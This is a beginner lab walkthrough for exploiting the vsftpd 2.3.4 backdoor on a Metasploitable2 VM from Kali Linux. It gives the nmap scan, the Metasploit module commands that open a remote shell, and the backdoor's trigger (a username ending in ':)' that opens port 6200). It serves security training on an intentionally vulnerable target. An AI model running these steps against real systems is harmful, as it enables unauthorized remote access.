# Beginner Walkthrough: Exploiting the vsftpd 2.3.4 FTP Backdoor on Metasploitable2

This guide will show you, step-by-step, how to exploit a real vulnerability in the Metasploitable2 virtual machine using Kali Linux. You’ll use the famous vsftpd 2.3.4 backdoor to gain a shell on the target.

---

## **What You Need**
- **Metasploitable2 VM** (target)
- **Kali Linux VM** (attacker)
- Both VMs must be on the same internal network (e.g., `homelab`)

---

## **Step 1: Find the Target’s IP Address**
1. Log in to Metasploitable2 (`msfadmin` / `msfadmin`).
2. Run:
   ```bash
   ifconfig
   ```
3. Note the IP address for `eth0` (e.g., `192.168.1.30`).

---

## **Step 2: Scan for Open FTP Port**
1. On Kali Linux, open a terminal.
2. Run:
   ```bash
   nmap -sV <TARGET_IP>
   ```
   Replace `<TARGET_IP>` with the IP from Step 1.
3. Look for this in the output:
   ```
   21/tcp open  ftp     vsftpd 2.3.4
   ```
   This means the vulnerable FTP service is running.

---

## **Step 3: Launch Metasploit Framework**
1. In Kali, start Metasploit:
   ```bash
   msfconsole
   ```
2. Wait for the prompt (`msf6 >`).

---

## **Step 4: Search for the Exploit**
1. In Metasploit, type:
   ```
   search vsftpd
   ```
2. You should see:
   ```
   exploit/unix/ftp/vsftpd_234_backdoor
   ```

---

## **Step 5: Use the Exploit Module**
1. Select the exploit:
   ```
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```
2. Set the target IP:
   ```
   set RHOSTS <TARGET_IP>
   ```
3. (Optional) Check the options:
   ```
   show options
   ```

---

## **Step 6: Run the Exploit**
1. Type:
   ```
   exploit
   ```
2. If successful, you’ll see:
   ```
   Command shell session 1 opened
   ```
3. You now have a shell on Metasploitable2! Try running:
   ```
   whoami
   uname -a
   ls
   ```

---

## **Step 7: Clean Up**
- Type `exit` to close the shell.
- Type `exit` again to leave Metasploit.

---

## **What Just Happened?**
- The vsftpd 2.3.4 service has a secret backdoor. When you connect with a username ending in ":)", it opens a shell on port 6200.
- Metasploit automates this attack and gives you a command shell on the target.

---

## **Why Is This Important?**
- This is a real-world example of how attackers exploit known vulnerabilities.
- Always keep software up to date and never use default or old versions in production!

---

## **References**
- [Metasploitable2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [vsftpd 2.3.4 Backdoor Exploit](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

---

*For educational use only. Never attack systems you do not own or have permission to test.* 